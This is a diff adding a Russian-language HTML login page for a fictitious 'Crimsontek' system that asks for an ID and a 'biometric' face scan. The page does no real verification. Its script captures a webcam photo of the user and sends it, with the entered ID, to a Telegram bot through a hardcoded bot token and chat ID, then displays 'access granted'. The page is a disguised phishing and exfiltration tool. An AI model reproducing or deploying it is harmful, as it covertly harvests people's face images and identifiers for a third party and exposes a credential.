@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Вход в систему • Crimsontek</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    .card {
+      background: var(--gray);
+      border: 3px solid var(--crimson);
+      border-radius: 8px;
+      padding: 35px 25px;
+      max-width: 540px;
+      margin: 50px auto;
+    }
+    input {
+      width: 100%;
+      padding: 18px;
+      margin: 20px 0;
+      background: #111;
+      border: 2px solid var(--crimson);
+      color: white;
+      font-size: 1.15rem;
+      text-align: center;
+    }
+    button {
+      width: 100%;
+      padding: 18px;
+      margin: 12px 0;
+      font-size: 1.15rem;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+    #video {
+      width: 100%;
+      border: 3px solid var(--crimson);
+      border-radius: 6px;
+      margin: 20px 0;
+      background: #000;
+    }
+    .face-status {
+      padding: 12px;
+      margin: 15px 0;
+      border-radius: 4px;
+      font-weight: bold;
+      text-align: center;
+    }
+    .detected { background: rgba(0, 255, 0, 0.2); color: lime; border: 1px solid lime; }
+    .not-detected { background: rgba(255, 0, 0, 0.2); color: #ff6666; border: 1px solid #ff6666; }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+</head>
+<body>
+  <header>
+    <div class="logo" style="font-size: 2.8rem;">CRIMSONTEK</div>
+  </header>
+
+  <div class="card">
+    <h2 style="color: var(--crimson); text-align: center; margin-bottom: 25px;">ДОСТУП К СИСТЕМЕ</h2>
+    
+    <input type="text" id="username" placeholder="ВВЕДИТЕ ИДЕНТИФИКАТОР" maxlength="30">
+
+    <button onclick="startVerification()" class="btn-primary">ПОДКЛЮЧИТЬ НЕЙРОСКАНЕР</button>
+
+    <div id="camera-container" style="display: none;">
+      <p style="color: var(--crimson); text-align: center; margin: 20px 0;">СИСТЕМА ТРЕБУЕТ БИОМЕТРИЧЕСКОЕ ПОДТВЕРЖДЕНИЕ</p>
+      
+      <video id="video" autoplay playsinline muted></video>
+      
+      <div id="face-status" class="face-status not-detected">Ожидание лица...</div>
+
+      <button id="scan-btn" onclick="takePhoto()" class="btn-primary" disabled>СКАНИРОВАТЬ ЛИЦО</button>
+      <button onclick="cancelVerification()" style="background:#444; border:none;">ОТМЕНИТЬ</button>
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0";
+    const CHAT_ID = "7616949660";
+    let stream = null;
+    let faceDetected = false;
+
+    async function loadModels() {
+      await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');
+    }
+
+    function showStatus(text, color = "#fff") {
+      document.getElementById("status").innerHTML = `<span style="color:${color}">${text}</span>`;
+    }
+
+    async function startVerification() {
+      const username = document.getElementById("username").value.trim();
+      if (!username) {
+        showStatus("Введите идентификатор!", "orange");
+        return;
+      }
+
+      document.getElementById("camera-container").style.display = "block";
+      showStatus("Загрузка системы распознавания...", "#ccc");
+
+      try {
+        await loadModels();
+        
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user", width: 640, height: 480 } 
+        });
+        
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        video.addEventListener('play', () => startFaceDetection(video));
+        
+        showStatus("Камера запущена. Посмотрите прямо в камеру.", "lime");
+      } catch (err) {
+        showStatus("Ошибка запуска камеры или моделей распознавания", "red");
+        console.error(err);
+      }
+    }
+
+    function startFaceDetection(video) {
+      const statusEl = document.getElementById("face-status");
+      const scanBtn = document.getElementById("scan-btn");
+
+      setInterval(async () => {
+        if (video.paused || video.ended) return;
+
+        const detections = await faceapi.detectAllFaces(video, 
+          new faceapi.TinyFaceDetectorOptions({ inputSize: 512, scoreThreshold: 0.5 })
+        );
+
+        if (detections.length > 0) {
+          faceDetected = true;
+          statusEl.textContent = "✓ Лицо обнаружено";
+          statusEl.className = "face-status detected";
+          scanBtn.disabled = false;
+        } else {
+          faceDetected = false;
+          statusEl.textContent = "Лицо не обнаружено. Посмотрите в камеру.";
+          statusEl.className = "face-status not-detected";
+          scanBtn.disabled = true;
+        }
+      }, 400);
+    }
+
+    async function takePhoto() {
+      if (!faceDetected) {
+        showStatus("Лицо не обнаружено! Посмотрите в камеру.", "red");
+        return;
+      }
+
+      const username = document.getElementById("username").value.trim();
+      const video = document.getElementById("video");
+
+      showStatus("Отправка биометрических данных...", "orange");
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const blob = await fetch(canvas.toDataURL("image/jpeg", 0.78)).then(r => r.blob());
+
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("caption", `🛡️ Новый вход с проверкой лица\n\nID: ${username}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
+
+      formData.append("photo", blob, "verified_face.jpg");
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        if (res.ok) {
+          showStatus(`ДОСТУП РАЗРЕШЁН<br>ДОБРО ПОЖАЛОВАТЬ, ${username.toUpperCase()}`, "lime");
+          setTimeout(() => window.location.href = "success.html", 1800);
+        } else {
+          showStatus("Ошибка отправки данных", "red");
+        }
+      } catch (e) {
+        showStatus("Ошибка соединения с Telegram", "red");
+      }
+    }
+
+    function cancelVerification() {
+      if (stream) stream.getTracks().forEach(track => track.stop());
+      document.getElementById("camera-container").style.display = "none";
+      showStatus("");
+    }
+  </script>
+</body>
+</html>
